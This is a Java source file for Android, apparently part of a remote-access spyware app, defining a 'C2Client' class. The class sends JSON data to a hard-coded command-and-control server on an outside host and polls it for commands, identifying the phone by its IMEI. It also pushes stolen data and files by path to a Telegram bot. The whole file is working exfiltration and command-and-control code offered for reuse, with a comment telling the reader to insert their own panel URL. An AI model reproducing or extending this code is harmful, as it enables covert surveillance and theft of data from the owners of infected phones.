package com.my.luck.network;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Client {
    private static final String TAG = "C2Client";
    private static String C2_SERVER_URL = "https://web-0eeh.onrender.com/api";  // Replace with your web panel URL
    private Context context;
    private TelegramBot telegramBot;

    public C2Client(Context context) {
        this.context = context;
        this.telegramBot = new TelegramBot(context);
    }

    // Send data to web panel
    public void sendToWebPanel(String endpoint, JSONObject data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER_URL + endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Data sent to web panel");
                } else {
                    Log.e(TAG, "Failed to send to web panel: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending to web panel", e);
            }
        }).start();
    }

    // Get commands from web panel (polling)
    public void fetchCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER_URL + "/get_commands");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("device_id", getDeviceId());

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                if (response.length() > 0) {
                    JSONObject json = new JSONObject(response.toString());
                    // Process commands via CommandProcessor
                    // CommandProcessor.processCommand(json.toString());
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error fetching commands", e);
            }
        }).start();
    }

    private String getDeviceId() {
        android.telephony.TelephonyManager tm = 
            (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm != null ? tm.getDeviceId() : "unknown";
    }

    // Send data to BOTH web panel AND Telegram
    public void sendToBoth(String endpoint, JSONObject data, String telegramCaption) {
        sendToWebPanel(endpoint, data);
        // Also send to Telegram if there's a file path or important data
        if (data.has("file_path")) {
            try {
                String filePath = data.getString("file_path");
                telegramBot.sendFile(filePath, telegramCaption);
            } catch (Exception e) {
                Log.e(TAG, "Error sending file to Telegram", e);
            }
        } else {
            telegramBot.sendMessage(telegramCaption + "\n" + data.toString());
        }
    }
}